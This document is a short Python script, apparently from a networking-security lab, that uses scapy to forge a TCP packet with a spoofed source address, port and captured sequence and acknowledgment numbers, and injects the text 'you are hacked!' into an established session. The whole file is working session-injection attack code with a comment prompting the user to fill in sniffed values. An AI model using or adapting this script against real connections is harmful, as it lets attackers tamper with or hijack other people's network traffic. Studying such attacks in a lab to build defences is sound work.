from scapy.all import IP, TCP, send

# Define the sniffed details (modify these based on your captured data)
source_ip = "10.0.0.2" 
destination_ip = "10.0.0.1" 
source_port = 45444  
destination_port = 8888

# Use the captured sequence and acknowledgment numbers
seq_num = 452587271 
ack_num = 4096594136  

# Payload to be injected
payload = "you are hacked!"

ip_layer = IP(src=source_ip, dst=destination_ip)
tcp_layer = TCP(sport=source_port, dport=destination_port, seq=seq_num, ack=ack_num, flags="PA")  

spoofed_packet = ip_layer / tcp_layer / payload


print(f"[*] Sending spoofed packet: {source_ip}:{source_port} -> {destination_ip}:{destination_port}")
send(spoofed_packet)
